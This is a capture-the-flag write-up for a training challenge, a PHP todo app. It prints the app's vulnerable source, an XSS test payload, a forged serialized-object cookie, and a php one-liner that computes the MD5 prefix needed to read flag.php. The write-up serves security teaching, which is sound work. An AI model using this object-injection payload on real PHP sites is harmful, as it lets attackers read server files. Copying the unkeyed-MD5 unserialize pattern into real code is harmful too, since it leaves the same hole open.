---
Name: "Todo App"
Category: "Security Summer School"
Difficulty: "Medium"
Description: "Exploiting unsafe PHP deserialization to read a server-side flag file."
---

# Todo App
The Todo App is vulnerable to XSS
```javascript
<script>alert("Hacked")</script>
```

![hacked](../../../public/images/security_summer_school/08_exotic_attacks/todo_hacked.png)

In the open source license we find some interesting php functions
```php
<?php

Class GPLSourceBloater {
    public function __toString()
    {
        return highlight_file('license.txt', true) . highlight_file($this->source, true);
    }
}

if (isset($_GET['source'])){
    $s = new GPLSourceBloater();
    $s->source = __FILE__;

    echo $s;
    exit;
}

$todos = [];

if (isset($_COOKIE['todos'])) {
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 32);
    $m = substr($c, 32);

    if(md5($m) === $h) {
        $todos = unserialize($m);
    }
}

if (isset($_POST['text']) && strlen($_POST['text']) > 1) {
    $todo = $_POST['text'];

    $todos[] = $todo;
    $m = serialize($todos);
    $h = md5($m);

    setcookie('todos', $h.$m);

    header('Location: ' . $_SERVER['REQUEST_URI']);
    exit;
}

?>
<html>
    <head>
        <title>TODO App</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
    </head>
    <body>
        <div style="width: 30rem; margin: 40px auto;">
            <h1 class="mt-4 mb-4">TODO App</h1>
            <p>TODOs:</p>
            <ul>
                <?php foreach($todos as $todo): ?>
                    <li><?php echo $todo; ?></li>
                <?php endforeach;?>
            </ul>

            <form method="POST">
                <textarea name="text" class="form-control"></textarea>
                <input type="submit" value="Store" class="btn btn-primary mt-3">
            </form>
            <div style="position: fixed; bottom: 4px; right: 15px;">
                <p><a href="?source">Open source license</a></p>
            </div>
        </div>
    </body>
</html>
```

Normally, `$todos` is an array of strings:

```php
<?php
a:2:{
    i:0;s:5:"Task1";
    i:1;s:5:"Task2";
}
```

Instead of storing strings, we craft a serialized array whose first element is a `GPLSourceBloater` object:

```php
<?php
a:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}
```

Breaking it down:

- `a:1` → an array containing one element.
- `i:0` → the first element has index `0`.
- `O:16:"GPLSourceBloater"` → an object of class `GPLSourceBloater`.
- `1` → the object contains one property.
- `s:6:"source"` → the property is named `source`.
- `s:8:"flag.php"` → the value of the property is `flag.php`.

When the cookie is unserialized, `$todos` becomes an array containing our object. Later, the application renders every todo item using:

```php
<?php foreach($todos as $todo): ?>
    <li><?php echo $todo; ?></li>
<?php endforeach; ?>
```

Since `$todo` is now a `GPLSourceBloater` object, `echo` automatically invokes its `__toString()` magic method:

```php
<?php
class GPLSourceBloater {
    public function __toString()
    {
        return highlight_file('license.txt', true)
             . highlight_file($this->source, true);
    }
}
```

Because we set the `source` property to `flag.php`, the application executes:

```php
<?php
highlight_file('flag.php', true);
```

revealing the contents of the file containing the flag.

Before the object is deserialized, the application verifies the integrity of the `todos` cookie:

```php
<?php
if (isset($_COOKIE['todos'])) {
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 32);
    $m = substr($c, 32);

    if(md5($m) === $h) {
        $todos = unserialize($m);
    }
}
```

The first 32 characters of the cookie must be the MD5 hash of the serialized payload. Since the application uses a plain MD5 hash, we can generate a valid hash ourselves

We generate the final cookie value by prepending the MD5 hash to the serialized payload and URL-encoding the result:

```bash
php -r '
$m="a:1:{i:0;O:16:\"GPLSourceBloater\":1:{s:6:\"source\";s:8:\"flag.php\";}}";
echo urlencode(md5($m).$m);
'
```

This produces:

```text
760463360e4919ca238d1566fc26661fa%3A1%3A%7Bi%3A0%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
```

After replacing the `todos` cookie with this value and refreshing the page, the application displays the contents of `flag.php`, revealing the flag.

![todo_flag](../../../public/images/security_summer_school/08_exotic_attacks/todo_flag.png)

```txt
SSS{0bj3ct_1nj3ct10ns_ar3_pa1nfull}
```

